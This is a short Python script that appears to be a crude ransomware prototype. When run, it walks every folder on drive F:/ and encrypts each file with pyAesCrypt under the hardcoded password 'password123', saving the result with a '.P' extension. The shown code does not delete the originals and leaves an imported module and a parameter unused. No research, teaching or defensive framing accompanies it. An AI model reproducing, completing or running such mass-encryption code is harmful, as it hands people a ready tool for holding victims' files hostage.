import pyAesCrypt
import os
import shutil

class Data:
    
    def drive_letters(self):
        letters = ['F:/']
        return letters

class Protect:
    
    def encrypt(self,password,file,output_file,round):
        pyAesCrypt.encryptFile(file, output_file, password)
    
    def decrypt(self,password,file,output_file,round):
        pyAesCrypt.decryptFile(file, output_file, password)

class File:
    def list_files(self,drive_letter):
        protect_obj = Protect()
        for path, subdirs, files in os.walk(drive_letter):
            for name in files:
                file_to_encrypt = os.path.join(path, name)
                file_after_encrypt = file_to_encrypt+".P"
                protect_obj.encrypt('password123',file_to_encrypt,file_after_encrypt,1)
  
def main():              
    file_obj = File()
    Data_obj = Data()
    drives = Data_obj.drive_letters()
    for drive in drives:
        file_obj.list_files(drive)
main()
